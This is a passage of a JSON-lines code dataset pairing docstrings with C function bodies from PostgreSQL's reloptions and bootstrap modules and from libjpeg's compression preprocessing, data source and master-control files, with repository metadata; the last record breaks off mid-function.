{"docstring": "/*\n *\t The main entry point for running the backend in bootstrap mode\n *\n *\t The bootstrap mode is used to initialize the template database.\n *\t The bootstrap backend doesn't speak SQL, but instead expects\n *\t commands in a special bootstrap language.\n */\n", "func_signal": "static void\nBootstrapModeMain(void)", "code": "{\n\tint\t\t\ti;\n\n\tAssert(!IsUnderPostmaster);\n\n\tSetProcessingMode(BootstrapProcessing);\n\n\t/*\n\t * Do backend-like initialization for bootstrap mode\n\t */\n\tInitProcess();\n\n\tInitPostgres(NULL, InvalidOid, NULL, NULL);\n\n\t/* Initialize stuff for bootstrap-file processing */\n\tfor (i = 0; i < MAXATTR; i++)\n\t{\n\t\tattrtypes[i] = NULL;\n\t\tNulls[i] = false;\n\t}\n\n\t/*\n\t * Process bootstrap input.\n\t */\n\tboot_yyparse();\n\n\t/*\n\t * We should now know about all mapped relations, so it's okay to write\n\t * out the initial relation mapping files.\n\t */\n\tRelationMapFinishBootstrap();\n\n\t/* Clean up and exit */\n\tcleanup();\n\tproc_exit(0);\n}", "path": "src\\backend\\bootstrap\\bootstrap.c", "repo_name": "postgres/postgres-old-soon-decommissioned", "stars": 133, "license": "other", "language": "c", "size": 163400}
{"docstring": "/*\n * Given the result of parseRelOptions and a parsing table, fill in the\n * struct (previously allocated with allocateReloptStruct) with the parsed\n * values.\n *\n * rdopts is the pointer to the allocated struct to be filled.\n * basesize is the sizeof(struct) that was passed to allocateReloptStruct.\n * options, of length numoptions, is parseRelOptions' output.\n * elems, of length numelems, is the table describing the allowed options.\n * When validate is true, it is expected that all options appear in elems.\n */\n", "func_signal": "void\nfillRelOptions(void *rdopts, Size basesize,\n\t\t\t   relopt_value *options, int numoptions,\n\t\t\t   bool validate,\n\t\t\t   const relopt_parse_elt *elems, int numelems)", "code": "{\n\tint\t\t\ti;\n\tint\t\t\toffset = basesize;\n\n\tfor (i = 0; i < numoptions; i++)\n\t{\n\t\tint\t\t\tj;\n\t\tbool\t\tfound = false;\n\n\t\tfor (j = 0; j < numelems; j++)\n\t\t{\n\t\t\tif (pg_strcasecmp(options[i].gen->name, elems[j].optname) == 0)\n\t\t\t{\n\t\t\t\trelopt_string *optstring;\n\t\t\t\tchar\t   *itempos = ((char *) rdopts) + elems[j].offset;\n\t\t\t\tchar\t   *string_val;\n\n\t\t\t\tswitch (options[i].gen->type)\n\t\t\t\t{\n\t\t\t\t\tcase RELOPT_TYPE_BOOL:\n\t\t\t\t\t\t*(bool *) itempos = options[i].isset ?\n\t\t\t\t\t\t\toptions[i].values.bool_val :\n\t\t\t\t\t\t\t((relopt_bool *) options[i].gen)->default_val;\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase RELOPT_TYPE_INT:\n\t\t\t\t\t\t*(int *) itempos = options[i].isset ?\n\t\t\t\t\t\t\toptions[i].values.int_val :\n\t\t\t\t\t\t\t((relopt_int *) options[i].gen)->default_val;\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase RELOPT_TYPE_REAL:\n\t\t\t\t\t\t*(double *) itempos = options[i].isset ?\n\t\t\t\t\t\t\toptions[i].values.real_val :\n\t\t\t\t\t\t\t((relopt_real *) options[i].gen)->default_val;\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase RELOPT_TYPE_STRING:\n\t\t\t\t\t\toptstring = (relopt_string *) options[i].gen;\n\t\t\t\t\t\tif (options[i].isset)\n\t\t\t\t\t\t\tstring_val = options[i].values.string_val;\n\t\t\t\t\t\telse if (!optstring->default_isnull)\n\t\t\t\t\t\t\tstring_val = optstring->default_val;\n\t\t\t\t\t\telse\n\t\t\t\t\t\t\tstring_val = NULL;\n\n\t\t\t\t\t\tif (string_val == NULL)\n\t\t\t\t\t\t\t*(int *) itempos = 0;\n\t\t\t\t\t\telse\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tstrcpy((char *) rdopts + offset, string_val);\n\t\t\t\t\t\t\t*(int *) itempos = offset;\n\t\t\t\t\t\t\toffset += strlen(string_val) + 1;\n\t\t\t\t\t\t}\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tdefault:\n\t\t\t\t\t\telog(ERROR, \"unrecognized reloption type %c\",\n\t\t\t\t\t\t\t options[i].gen->type);\n\t\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tfound = true;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tif (validate && !found)\n\t\t\telog(ERROR, \"reloption \\\"%s\\\" not found in parse table\",\n\t\t\t\t options[i].gen->name);\n\t}\n\tSET_VARSIZE(rdopts, offset);\n}", "path": "src\\backend\\access\\common\\reloptions.c", "repo_name": "postgres/postgres-old-soon-decommissioned", "stars": 133, "license": "other", "language": "c", "size": 163400}
{"docstring": "/* ----------------\n *\t\tboot_get_type_io_data\n *\n * Obtain type I/O information at bootstrap time.  This intentionally has\n * almost the same API as lsyscache.c's get_type_io_data, except that\n * we only support obtaining the typinput and typoutput routines, not\n * the binary I/O routines.  It is exported so that array_in and array_out\n * can be made to work during early bootstrap.\n * ----------------\n */\n", "func_signal": "void\nboot_get_type_io_data(Oid typid,\n\t\t\t\t\t  int16 *typlen,\n\t\t\t\t\t  bool *typbyval,\n\t\t\t\t\t  char *typalign,\n\t\t\t\t\t  char *typdelim,\n\t\t\t\t\t  Oid *typioparam,\n\t\t\t\t\t  Oid *typinput,\n\t\t\t\t\t  Oid *typoutput)", "code": "{\n\tif (Typ != NULL)\n\t{\n\t\t/* We have the boot-time contents of pg_type, so use it */\n\t\tstruct typmap **app;\n\t\tstruct typmap *ap;\n\n\t\tapp = Typ;\n\t\twhile (*app && (*app)->am_oid != typid)\n\t\t\t++app;\n\t\tap = *app;\n\t\tif (ap == NULL)\n\t\t\telog(ERROR, \"type OID %u not found in Typ list\", typid);\n\n\t\t*typlen = ap->am_typ.typlen;\n\t\t*typbyval = ap->am_typ.typbyval;\n\t\t*typalign = ap->am_typ.typalign;\n\t\t*typdelim = ap->am_typ.typdelim;\n\n\t\t/* XXX this logic must match getTypeIOParam() */\n\t\tif (OidIsValid(ap->am_typ.typelem))\n\t\t\t*typioparam = ap->am_typ.typelem;\n\t\telse\n\t\t\t*typioparam = typid;\n\n\t\t*typinput = ap->am_typ.typinput;\n\t\t*typoutput = ap->am_typ.typoutput;\n\t}\n\telse\n\t{\n\t\t/* We don't have pg_type yet, so use the hard-wired TypInfo array */\n\t\tint\t\t\ttypeindex;\n\n\t\tfor (typeindex = 0; typeindex < n_types; typeindex++)\n\t\t{\n\t\t\tif (TypInfo[typeindex].oid == typid)\n\t\t\t\tbreak;\n\t\t}\n\t\tif (typeindex >= n_types)\n\t\t\telog(ERROR, \"type OID %u not found in TypInfo\", typid);\n\n\t\t*typlen = TypInfo[typeindex].len;\n\t\t*typbyval = TypInfo[typeindex].byval;\n\t\t*typalign = TypInfo[typeindex].align;\n\t\t/* We assume typdelim is ',' for all boot-time types */\n\t\t*typdelim = ',';\n\n\t\t/* XXX this logic must match getTypeIOParam() */\n\t\tif (OidIsValid(TypInfo[typeindex].elem))\n\t\t\t*typioparam = TypInfo[typeindex].elem;\n\t\telse\n\t\t\t*typioparam = typid;\n\n\t\t*typinput = TypInfo[typeindex].inproc;\n\t\t*typoutput = TypInfo[typeindex].outproc;\n\t}\n}", "path": "src\\backend\\bootstrap\\bootstrap.c", "repo_name": "postgres/postgres-old-soon-decommissioned", "stars": 133, "license": "other", "language": "c", "size": 163400}
{"docstring": "/*\n * add_string_reloption\n *\t\tAdd a new string reloption\n *\n * \"validator\" is an optional function pointer that can be used to test the\n * validity of the values.\tIt must elog(ERROR) when the argument string is\n * not acceptable for the variable.  Note that the default value must pass\n * the validation.\n */\n", "func_signal": "void\nadd_string_reloption(bits32 kinds, char *name, char *desc, char *default_val,\n\t\t\t\t\t validate_string_relopt validator)", "code": "{\n\tMemoryContext oldcxt;\n\trelopt_string *newoption;\n\tint\t\t\tdefault_len = 0;\n\n\toldcxt = MemoryContextSwitchTo(TopMemoryContext);\n\n\tif (default_val)\n\t\tdefault_len = strlen(default_val);\n\n\tnewoption = palloc0(sizeof(relopt_string) + default_len);\n\n\tnewoption->gen.name = pstrdup(name);\n\tif (desc)\n\t\tnewoption->gen.desc = pstrdup(desc);\n\telse\n\t\tnewoption->gen.desc = NULL;\n\tnewoption->gen.kinds = kinds;\n\tnewoption->gen.namelen = strlen(name);\n\tnewoption->gen.type = RELOPT_TYPE_STRING;\n\tnewoption->validate_cb = validator;\n\tif (default_val)\n\t{\n\t\tstrcpy(newoption->default_val, default_val);\n\t\tnewoption->default_len = default_len;\n\t\tnewoption->default_isnull = false;\n\t}\n\telse\n\t{\n\t\tnewoption->default_val[0] = '\\0';\n\t\tnewoption->default_len = 0;\n\t\tnewoption->default_isnull = true;\n\t}\n\n\t/* make sure the validator/default combination is sane */\n\tif (newoption->validate_cb)\n\t\t(newoption->validate_cb) (newoption->default_val);\n\n\tMemoryContextSwitchTo(oldcxt);\n\n\tadd_reloption((relopt_gen *) newoption);\n}", "path": "src\\backend\\access\\common\\reloptions.c", "repo_name": "postgres/postgres-old-soon-decommissioned", "stars": 133, "license": "other", "language": "c", "size": 163400}
{"docstring": "/*\n * add_int_reloption\n *\t\tAdd a new integer reloption\n */\n", "func_signal": "void\nadd_int_reloption(bits32 kinds, char *name, char *desc, int default_val,\n\t\t\t\t  int min_val, int max_val)", "code": "{\n\trelopt_int *newoption;\n\n\tnewoption = (relopt_int *) allocate_reloption(kinds, RELOPT_TYPE_INT,\n\t\t\t\t\t\t\t\t\t\t\t\t  name, desc);\n\tnewoption->default_val = default_val;\n\tnewoption->min = min_val;\n\tnewoption->max = max_val;\n\n\tadd_reloption((relopt_gen *) newoption);\n}", "path": "src\\backend\\access\\common\\reloptions.c", "repo_name": "postgres/postgres-old-soon-decommissioned", "stars": 133, "license": "other", "language": "c", "size": 163400}
{"docstring": "/*\n * Parse options for indexes.\n *\n *\tamoptions\tOid of option parser\n *\treloptions\toptions as text[] datum\n *\tvalidate\terror flag\n */\n", "func_signal": "bytea *\nindex_reloptions(RegProcedure amoptions, Datum reloptions, bool validate)", "code": "{\n\tFmgrInfo\tflinfo;\n\tFunctionCallInfoData fcinfo;\n\tDatum\t\tresult;\n\n\tAssert(RegProcedureIsValid(amoptions));\n\n\t/* Assume function is strict */\n\tif (!PointerIsValid(DatumGetPointer(reloptions)))\n\t\treturn NULL;\n\n\t/* Can't use OidFunctionCallN because we might get a NULL result */\n\tfmgr_info(amoptions, &flinfo);\n\n\tInitFunctionCallInfoData(fcinfo, &flinfo, 2, NULL, NULL);\n\n\tfcinfo.arg[0] = reloptions;\n\tfcinfo.arg[1] = BoolGetDatum(validate);\n\tfcinfo.argnull[0] = false;\n\tfcinfo.argnull[1] = false;\n\n\tresult = FunctionCallInvoke(&fcinfo);\n\n\tif (fcinfo.isnull || DatumGetPointer(result) == NULL)\n\t\treturn NULL;\n\n\treturn DatumGetByteaP(result);\n}", "path": "src\\backend\\access\\common\\reloptions.c", "repo_name": "postgres/postgres-old-soon-decommissioned", "stars": 133, "license": "other", "language": "c", "size": 163400}
{"docstring": "/* ----------------\n * DEFINEATTR()\n *\n * define a <field,type> pair\n * if there are n fields in a relation to be created, this routine\n * will be called n times\n * ----------------\n */\n", "func_signal": "void\nDefineAttr(char *name, char *type, int attnum)", "code": "{\n\tOid\t\t\ttypeoid;\n\n\tif (boot_reldesc != NULL)\n\t{\n\t\telog(WARNING, \"no open relations allowed with CREATE command\");\n\t\tcloserel(NULL);\n\t}\n\n\tif (attrtypes[attnum] == NULL)\n\t\tattrtypes[attnum] = AllocateAttribute();\n\tMemSet(attrtypes[attnum], 0, ATTRIBUTE_FIXED_PART_SIZE);\n\n\tnamestrcpy(&attrtypes[attnum]->attname, name);\n\telog(DEBUG4, \"column %s %s\", NameStr(attrtypes[attnum]->attname), type);\n\tattrtypes[attnum]->attnum = attnum + 1;\t\t/* fillatt */\n\n\ttypeoid = gettype(type);\n\n\tif (Typ != NULL)\n\t{\n\t\tattrtypes[attnum]->atttypid = Ap->am_oid;\n\t\tattrtypes[attnum]->attlen = Ap->am_typ.typlen;\n\t\tattrtypes[attnum]->attbyval = Ap->am_typ.typbyval;\n\t\tattrtypes[attnum]->attstorage = Ap->am_typ.typstorage;\n\t\tattrtypes[attnum]->attalign = Ap->am_typ.typalign;\n\t\t/* if an array type, assume 1-dimensional attribute */\n\t\tif (Ap->am_typ.typelem != InvalidOid && Ap->am_typ.typlen < 0)\n\t\t\tattrtypes[attnum]->attndims = 1;\n\t\telse\n\t\t\tattrtypes[attnum]->attndims = 0;\n\t}\n\telse\n\t{\n\t\tattrtypes[attnum]->atttypid = TypInfo[typeoid].oid;\n\t\tattrtypes[attnum]->attlen = TypInfo[typeoid].len;\n\t\tattrtypes[attnum]->attbyval = TypInfo[typeoid].byval;\n\t\tattrtypes[attnum]->attstorage = TypInfo[typeoid].storage;\n\t\tattrtypes[attnum]->attalign = TypInfo[typeoid].align;\n\t\t/* if an array type, assume 1-dimensional attribute */\n\t\tif (TypInfo[typeoid].elem != InvalidOid &&\n\t\t\tattrtypes[attnum]->attlen < 0)\n\t\t\tattrtypes[attnum]->attndims = 1;\n\t\telse\n\t\t\tattrtypes[attnum]->attndims = 0;\n\t}\n\n\tattrtypes[attnum]->attstattarget = -1;\n\tattrtypes[attnum]->attcacheoff = -1;\n\tattrtypes[attnum]->atttypmod = -1;\n\tattrtypes[attnum]->attislocal = true;\n\n\t/*\n\t * Mark as \"not null\" if type is fixed-width and prior columns are too.\n\t * This corresponds to case where column can be accessed directly via C\n\t * struct declaration.\n\t *\n\t * oidvector and int2vector are also treated as not-nullable, even though\n\t * they are no longer fixed-width.\n\t */\n#define MARKNOTNULL(att) \\\n\t((att)->attlen > 0 || \\\n\t (att)->atttypid == OIDVECTOROID || \\\n\t (att)->atttypid == INT2VECTOROID)\n\n\tif (MARKNOTNULL(attrtypes[attnum]))\n\t{\n\t\tint\t\t\ti;\n\n\t\tfor (i = 0; i < attnum; i++)\n\t\t{\n\t\t\tif (!MARKNOTNULL(attrtypes[i]))\n\t\t\t\tbreak;\n\t\t}\n\t\tif (i == attnum)\n\t\t\tattrtypes[attnum]->attnotnull = true;\n\t}\n}", "path": "src\\backend\\bootstrap\\bootstrap.c", "repo_name": "postgres/postgres-old-soon-decommissioned", "stars": 133, "license": "other", "language": "c", "size": 163400}
{"docstring": "/* ----------------\n *\t\tcleanup\n * ----------------\n */\n", "func_signal": "static void\ncleanup(void)", "code": "{\n\tif (boot_reldesc != NULL)\n\t\tcloserel(NULL);\n}", "path": "src\\backend\\bootstrap\\bootstrap.c", "repo_name": "postgres/postgres-old-soon-decommissioned", "stars": 133, "license": "other", "language": "c", "size": 163400}
{"docstring": "/*\n * Option parser for attribute reloptions\n */\n", "func_signal": "bytea *\nattribute_reloptions(Datum reloptions, bool validate)", "code": "{\n\trelopt_value *options;\n\tAttributeOpts *aopts;\n\tint\t\t\tnumoptions;\n\tstatic const relopt_parse_elt tab[] = {\n\t\t{\"n_distinct\", RELOPT_TYPE_REAL, offsetof(AttributeOpts, n_distinct)},\n\t\t{\"n_distinct_inherited\", RELOPT_TYPE_REAL, offsetof(AttributeOpts, n_distinct_inherited)}\n\t};\n\n\toptions = parseRelOptions(reloptions, validate, RELOPT_KIND_ATTRIBUTE,\n\t\t\t\t\t\t\t  &numoptions);\n\n\t/* if none set, we're done */\n\tif (numoptions == 0)\n\t\treturn NULL;\n\n\taopts = allocateReloptStruct(sizeof(AttributeOpts), options, numoptions);\n\n\tfillRelOptions((void *) aopts, sizeof(AttributeOpts), options, numoptions,\n\t\t\t\t   validate, tab, lengthof(tab));\n\n\tpfree(options);\n\n\treturn (bytea *) aopts;\n}", "path": "src\\backend\\access\\common\\reloptions.c", "repo_name": "postgres/postgres-old-soon-decommissioned", "stars": 133, "license": "other", "language": "c", "size": 163400}
{"docstring": "/*\n * add_reloption_kind\n *\t\tCreate a new relopt_kind value, to be used in custom reloptions by\n *\t\tuser-defined AMs.\n */\n", "func_signal": "relopt_kind\nadd_reloption_kind(void)", "code": "{\n\t/* don't hand out the last bit so that the enum's behavior is portable */\n\tif (last_assigned_kind >= RELOPT_KIND_MAX)\n\t\tereport(ERROR,\n\t\t\t\t(errcode(ERRCODE_PROGRAM_LIMIT_EXCEEDED),\n\t\t\terrmsg(\"user-defined relation parameter types limit exceeded\")));\n\tlast_assigned_kind <<= 1;\n\treturn (relopt_kind) last_assigned_kind;\n}", "path": "src\\backend\\access\\common\\reloptions.c", "repo_name": "postgres/postgres-old-soon-decommissioned", "stars": 133, "license": "other", "language": "c", "size": 163400}
{"docstring": "/*\n * Given the result from parseRelOptions, allocate a struct that's of the\n * specified base size plus any extra space that's needed for string variables.\n *\n * \"base\" should be sizeof(struct) of the reloptions struct (StdRdOptions or\n * equivalent).\n */\n", "func_signal": "void *\nallocateReloptStruct(Size base, relopt_value *options, int numoptions)", "code": "{\n\tSize\t\tsize = base;\n\tint\t\t\ti;\n\n\tfor (i = 0; i < numoptions; i++)\n\t\tif (options[i].gen->type == RELOPT_TYPE_STRING)\n\t\t\tsize += GET_STRING_RELOPTION_LEN(options[i]) + 1;\n\n\treturn palloc0(size);\n}", "path": "src\\backend\\access\\common\\reloptions.c", "repo_name": "postgres/postgres-old-soon-decommissioned", "stars": 133, "license": "other", "language": "c", "size": 163400}
{"docstring": "/*\n * Expand an image vertically from height input_rows to height output_rows,\n * by duplicating the bottom row.\n */\n", "func_signal": "LOCAL(void)\nexpand_bottom_edge (JSAMPARRAY image_data, JDIMENSION num_cols,\n\t\t    int input_rows, int output_rows)", "code": "{\n  register int row;\n\n  for (row = input_rows; row < output_rows; row++) {\n    jcopy_sample_rows(image_data, input_rows-1, image_data, row,\n\t\t      1, num_cols);\n  }\n}", "path": "jcprepct.c", "repo_name": "cloudflare/jpegtran", "stars": 128, "license": "None", "language": "c", "size": 1107}
{"docstring": "/*\n * Prepare for input from a stdio stream.\n * The caller must have already opened the stream, and is responsible\n * for closing it after finishing decompression.\n */\n", "func_signal": "GLOBAL(void)\njpeg_stdio_src (j_decompress_ptr cinfo, FILE * infile)", "code": "{\n  my_src_ptr src;\n\n  /* The source object and input buffer are made permanent so that a series\n   * of JPEG images can be read from the same file by calling jpeg_stdio_src\n   * only before the first one.  (If we discarded the buffer at the end of\n   * one image, we'd likely lose the start of the next one.)\n   * This makes it unsafe to use this manager and a different source\n   * manager serially with the same JPEG object.  Caveat programmer.\n   */\n  if (cinfo->src == NULL) {\t/* first time for this JPEG object? */\n    cinfo->src = (struct jpeg_source_mgr *)\n      (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_PERMANENT,\n\t\t\t\t  SIZEOF(my_source_mgr));\n    src = (my_src_ptr) cinfo->src;\n    src->buffer = (JOCTET *)\n      (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_PERMANENT,\n\t\t\t\t  INPUT_BUF_SIZE * SIZEOF(JOCTET));\n  }\n\n  src = (my_src_ptr) cinfo->src;\n  src->pub.init_source = init_source;\n  src->pub.fill_input_buffer = fill_input_buffer;\n  src->pub.skip_input_data = skip_input_data;\n  src->pub.resync_to_restart = jpeg_resync_to_restart; /* use default method */\n  src->pub.term_source = term_source;\n  src->infile = infile;\n  src->pub.bytes_in_buffer = 0; /* forces fill_input_buffer on first read */\n  src->pub.next_input_byte = NULL; /* until buffer loaded */\n}", "path": "jdatasrc.c", "repo_name": "cloudflare/jpegtran", "stars": 128, "license": "None", "language": "c", "size": 1107}
{"docstring": "/*\n * Create the wrapped-around downsampling input buffer needed for context mode.\n */\n", "func_signal": "LOCAL(void)\ncreate_context_buffer (j_compress_ptr cinfo)", "code": "{\n  my_prep_ptr prep = (my_prep_ptr) cinfo->prep;\n  int rgroup_height = cinfo->max_v_samp_factor;\n  int ci, i;\n  jpeg_component_info * compptr;\n  JSAMPARRAY true_buffer, fake_buffer;\n\n  /* Grab enough space for fake row pointers for all the components;\n   * we need five row groups' worth of pointers for each component.\n   */\n  fake_buffer = (JSAMPARRAY)\n    (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_IMAGE,\n\t\t\t\t(cinfo->num_components * 5 * rgroup_height) *\n\t\t\t\tSIZEOF(JSAMPROW));\n\n  for (ci = 0, compptr = cinfo->comp_info; ci < cinfo->num_components;\n       ci++, compptr++) {\n    /* Allocate the actual buffer space (3 row groups) for this component.\n     * We make the buffer wide enough to allow the downsampler to edge-expand\n     * horizontally within the buffer, if it so chooses.\n     */\n    true_buffer = (*cinfo->mem->alloc_sarray)\n      ((j_common_ptr) cinfo, JPOOL_IMAGE,\n       (JDIMENSION) (((long) compptr->width_in_blocks *\n\t\t      cinfo->min_DCT_h_scaled_size *\n\t\t      cinfo->max_h_samp_factor) / compptr->h_samp_factor),\n       (JDIMENSION) (3 * rgroup_height));\n    /* Copy true buffer row pointers into the middle of the fake row array */\n    MEMCOPY(fake_buffer + rgroup_height, true_buffer,\n\t    3 * rgroup_height * SIZEOF(JSAMPROW));\n    /* Fill in the above and below wraparound pointers */\n    for (i = 0; i < rgroup_height; i++) {\n      fake_buffer[i] = true_buffer[2 * rgroup_height + i];\n      fake_buffer[4 * rgroup_height + i] = true_buffer[i];\n    }\n    prep->color_buf[ci] = fake_buffer + rgroup_height;\n    fake_buffer += 5 * rgroup_height; /* point to space for next component */\n  }\n}", "path": "jcprepct.c", "repo_name": "cloudflare/jpegtran", "stars": 128, "license": "None", "language": "c", "size": 1107}
{"docstring": "/*\n * Skip data --- used to skip over a potentially large amount of\n * uninteresting data (such as an APPn marker).\n *\n * Writers of suspendable-input applications must note that skip_input_data\n * is not granted the right to give a suspension return.  If the skip extends\n * beyond the data currently in the buffer, the buffer can be marked empty so\n * that the next read will cause a fill_input_buffer call that can suspend.\n * Arranging for additional bytes to be discarded before reloading the input\n * buffer is the application writer's problem.\n */\n", "func_signal": "METHODDEF(void)\nskip_input_data (j_decompress_ptr cinfo, long num_bytes)", "code": "{\n  struct jpeg_source_mgr * src = cinfo->src;\n\n  /* Just a dumb implementation for now.  Could use fseek() except\n   * it doesn't work on pipes.  Not clear that being smart is worth\n   * any trouble anyway --- large skips are infrequent.\n   */\n  if (num_bytes > 0) {\n    while (num_bytes > (long) src->bytes_in_buffer) {\n      num_bytes -= (long) src->bytes_in_buffer;\n      (void) (*src->fill_input_buffer) (cinfo);\n      /* note we assume that fill_input_buffer will never return FALSE,\n       * so suspension need not be handled.\n       */\n    }\n    src->next_input_byte += (size_t) num_bytes;\n    src->bytes_in_buffer -= (size_t) num_bytes;\n  }\n}", "path": "jdatasrc.c", "repo_name": "cloudflare/jpegtran", "stars": 128, "license": "None", "language": "c", "size": 1107}
{"docstring": "/*\n * Process some data in the simple no-context case.\n *\n * Preprocessor output data is counted in \"row groups\".  A row group\n * is defined to be v_samp_factor sample rows of each component.\n * Downsampling will produce this much data from each max_v_samp_factor\n * input rows.\n */\n", "func_signal": "METHODDEF(void)\npre_process_data (j_compress_ptr cinfo,\n\t\t  JSAMPARRAY input_buf, JDIMENSION *in_row_ctr,\n\t\t  JDIMENSION in_rows_avail,\n\t\t  JSAMPIMAGE output_buf, JDIMENSION *out_row_group_ctr,\n\t\t  JDIMENSION out_row_groups_avail)", "code": "{\n  my_prep_ptr prep = (my_prep_ptr) cinfo->prep;\n  int numrows, ci;\n  JDIMENSION inrows;\n  jpeg_component_info * compptr;\n\n  while (*in_row_ctr < in_rows_avail &&\n\t *out_row_group_ctr < out_row_groups_avail) {\n    /* Do color conversion to fill the conversion buffer. */\n    inrows = in_rows_avail - *in_row_ctr;\n    numrows = cinfo->max_v_samp_factor - prep->next_buf_row;\n    numrows = (int) MIN((JDIMENSION) numrows, inrows);\n    (*cinfo->cconvert->color_convert) (cinfo, input_buf + *in_row_ctr,\n\t\t\t\t       prep->color_buf,\n\t\t\t\t       (JDIMENSION) prep->next_buf_row,\n\t\t\t\t       numrows);\n    *in_row_ctr += numrows;\n    prep->next_buf_row += numrows;\n    prep->rows_to_go -= numrows;\n    /* If at bottom of image, pad to fill the conversion buffer. */\n    if (prep->rows_to_go == 0 &&\n\tprep->next_buf_row < cinfo->max_v_samp_factor) {\n      for (ci = 0; ci < cinfo->num_components; ci++) {\n\texpand_bottom_edge(prep->color_buf[ci], cinfo->image_width,\n\t\t\t   prep->next_buf_row, cinfo->max_v_samp_factor);\n      }\n      prep->next_buf_row = cinfo->max_v_samp_factor;\n    }\n    /* If we've filled the conversion buffer, empty it. */\n    if (prep->next_buf_row == cinfo->max_v_samp_factor) {\n      (*cinfo->downsample->downsample) (cinfo,\n\t\t\t\t\tprep->color_buf, (JDIMENSION) 0,\n\t\t\t\t\toutput_buf, *out_row_group_ctr);\n      prep->next_buf_row = 0;\n      (*out_row_group_ctr)++;\n    }\n    /* If at bottom of image, pad the output to a full iMCU height.\n     * Note we assume the caller is providing a one-iMCU-height output buffer!\n     */\n    if (prep->rows_to_go == 0 &&\n\t*out_row_group_ctr < out_row_groups_avail) {\n      for (ci = 0, compptr = cinfo->comp_info; ci < cinfo->num_components;\n\t   ci++, compptr++) {\n\tnumrows = (compptr->v_samp_factor * compptr->DCT_v_scaled_size) /\n\t\t  cinfo->min_DCT_v_scaled_size;\n\texpand_bottom_edge(output_buf[ci],\n\t\t\t   compptr->width_in_blocks * compptr->DCT_h_scaled_size,\n\t\t\t   (int) (*out_row_group_ctr * numrows),\n\t\t\t   (int) (out_row_groups_avail * numrows));\n      }\n      *out_row_group_ctr = out_row_groups_avail;\n      break;\t\t\t/* can exit outer loop without test */\n    }\n  }\n}", "path": "jcprepct.c", "repo_name": "cloudflare/jpegtran", "stars": 128, "license": "None", "language": "c", "size": 1107}
{"docstring": "/*\n * Initialize master compression control.\n */\n", "func_signal": "GLOBAL(void)\njinit_c_master_control (j_compress_ptr cinfo, boolean transcode_only)", "code": "{\n  my_master_ptr master;\n\n  master = (my_master_ptr)\n      (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_IMAGE,\n\t\t\t\t  SIZEOF(my_comp_master));\n  cinfo->master = &master->pub;\n  master->pub.prepare_for_pass = prepare_for_pass;\n  master->pub.pass_startup = pass_startup;\n  master->pub.finish_pass = finish_pass_master;\n  master->pub.is_last_pass = FALSE;\n\n  /* Validate parameters, determine derived values */\n  initial_setup(cinfo, transcode_only);\n\n  if (cinfo->scan_info != NULL) {\n#ifdef C_MULTISCAN_FILES_SUPPORTED\n    validate_script(cinfo);\n    if (cinfo->block_size < DCTSIZE)\n      reduce_script(cinfo);\n#else\n    ERREXIT(cinfo, JERR_NOT_COMPILED);\n#endif\n  } else {\n    cinfo->progressive_mode = FALSE;\n    cinfo->num_scans = 1;\n  }\n\n  if (cinfo->optimize_coding)\n    cinfo->arith_code = FALSE; /* disable arithmetic coding */\n  else if (! cinfo->arith_code &&\n\t   (cinfo->progressive_mode ||\n\t    (cinfo->block_size > 1 && cinfo->block_size < DCTSIZE)))\n    /* TEMPORARY HACK ??? */\n    /* assume default tables no good for progressive or reduced AC mode */\n    cinfo->optimize_coding = TRUE; /* force Huffman optimization */\n\n  /* Initialize my private state */\n  if (transcode_only) {\n    /* no main pass in transcoding */\n    if (cinfo->optimize_coding)\n      master->pass_type = huff_opt_pass;\n    else\n      master->pass_type = output_pass;\n  } else {\n    /* for normal compression, first pass is always this type: */\n    master->pass_type = main_pass;\n  }\n  master->scan_number = 0;\n  master->pass_number = 0;\n  if (cinfo->optimize_coding)\n    master->total_passes = cinfo->num_scans * 2;\n  else\n    master->total_passes = cinfo->num_scans;\n}", "path": "jcmaster.c", "repo_name": "cloudflare/jpegtran", "stars": 128, "license": "None", "language": "c", "size": 1107}
{"docstring": "/*\n * Initialize source --- called by jpeg_read_header\n * before any data is actually read.\n */\n", "func_signal": "METHODDEF(void)\ninit_source (j_decompress_ptr cinfo)", "code": "{\n  my_src_ptr src = (my_src_ptr) cinfo->src;\n\n  /* We reset the empty-input-file flag for each image,\n   * but we don't clear the input buffer.\n   * This is correct behavior for reading a series of images from one source.\n   */\n  src->start_of_file = TRUE;\n}", "path": "jdatasrc.c", "repo_name": "cloudflare/jpegtran", "stars": 128, "license": "None", "language": "c", "size": 1107}
{"docstring": "/*\n * Initialize preprocessing controller.\n */\n", "func_signal": "GLOBAL(void)\njinit_c_prep_controller (j_compress_ptr cinfo, boolean need_full_buffer)", "code": "{\n  my_prep_ptr prep;\n  int ci;\n  jpeg_component_info * compptr;\n\n  if (need_full_buffer)\t\t/* safety check */\n    ERREXIT(cinfo, JERR_BAD_BUFFER_MODE);\n\n  prep = (my_prep_ptr)\n    (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_IMAGE,\n\t\t\t\tSIZEOF(my_prep_controller));\n  cinfo->prep = (struct jpeg_c_prep_controller *) prep;\n  prep->pub.start_pass = start_pass_prep;\n\n  /* Allocate the color conversion buffer.\n   * We make the buffer wide enough to allow the downsampler to edge-expand\n   * horizontally within the buffer, if it so chooses.\n   */\n  if (cinfo->downsample->need_context_rows) {\n    /* Set up to provide context rows */\n#ifdef CONTEXT_ROWS_SUPPORTED\n    prep->pub.pre_process_data = pre_process_context;\n    create_context_buffer(cinfo);\n#else\n    ERREXIT(cinfo, JERR_NOT_COMPILED);\n#endif\n  } else {\n    /* No context, just make it tall enough for one row group */\n    prep->pub.pre_process_data = pre_process_data;\n    for (ci = 0, compptr = cinfo->comp_info; ci < cinfo->num_components;\n\t ci++, compptr++) {\n      prep->color_buf[ci] = (*cinfo->mem->alloc_sarray)\n\t((j_common_ptr) cinfo, JPOOL_IMAGE,\n\t (JDIMENSION) (((long) compptr->width_in_blocks *\n\t\t\tcinfo->min_DCT_h_scaled_size 